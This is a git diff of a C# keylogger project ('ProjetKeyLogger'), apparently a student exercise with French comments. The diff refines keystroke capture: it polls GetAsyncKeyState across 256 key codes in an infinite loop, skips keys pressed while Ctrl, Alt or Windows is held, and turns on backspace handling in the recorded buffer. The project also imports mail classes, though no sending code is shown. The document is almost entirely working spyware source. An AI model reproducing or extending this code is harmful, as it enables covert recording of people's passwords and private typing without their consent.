@@ -9,6 +9,7 @@ using System.Net.Mail;
 using System.Runtime.InteropServices;
 using System.Net.Mail;
 using System.Threading;
+using System.Windows.Input;
 
 namespace ProjetKeyLogger
 {
@@ -56,25 +57,41 @@ namespace ProjetKeyLogger
 
             //capture les frappes de touches et les afficher dans la console
             bool majuscule = false;
+
             while (true) //boucle "infinie" pour avoir le statut des touches en temps réel
             {
                 //Comme on a une boucle infinie, il faut permettre aux autres fonctions de se déclencher et donc arreter la boucle temporairement
                 Thread.Sleep(5); //nombre en miliseconde
 
+                //booleen qui autorise ou non la saisie du clavier (On l'autorise pour l'instant)
+                Boolean autorise_saisie = true;
+
+                //liste des touches pour lesquelles la saisie est intérrompue
+                //Si une de ces touches est enfoncé, la capture est intérompu exemple : "ctrl + c" la lettre "c" n'est pas capturé
+                int[] list_non_accepte = new int[] { 17 ,18 ,91 };
+
+                //le tableau des touches d'interruptions de la capture est parcouru
+                for (int i = 0; i < list_non_accepte.Length; i++)
+                {
+                    //Si la touche est enfoncée on suspend l'autorisation de saisie du texte
+                    int statut_cle = GetAsyncKeyState(list_non_accepte[i]);
+                    if (statut_cle == 32769) { autorise_saisie = false;  }
+                }
 
                 //verification de l'état de chaque touche (up ou down)
                 //avec une table des code ASCII, les codes de clavier vont de 0 à 127
                 //on va vérifier ces 128 touches
                 
-                for (int codeASCII = 0; codeASCII < 128; codeASCII++)
+                for (int codeASCII = 0; codeASCII < 256; codeASCII++)
                 {
+                    
                     int statut_cle = GetAsyncKeyState(codeASCII);
                     //le statut d'un clé est a 0 si elle n'est pas active
                     //le statut est a 32769 si la touche est appuyé donc on va pouvoir voir les touches
                     // on caste le nombre ascii en char
-                   
-                    if (statut_cle == 32769)
-                    {                        
+                    if (statut_cle == 32769 && autorise_saisie == true)
+                    {
+                        Console.WriteLine(codeASCII);
                         switch (codeASCII)
                         {
                             
@@ -99,7 +116,7 @@ namespace ProjetKeyLogger
                                                                    
                                 break;
                             case 8:
-                                // enregistrement.effacerContenu();
+                                enregistrement.effacerContenu();
                                 break;
 
                             case 110:
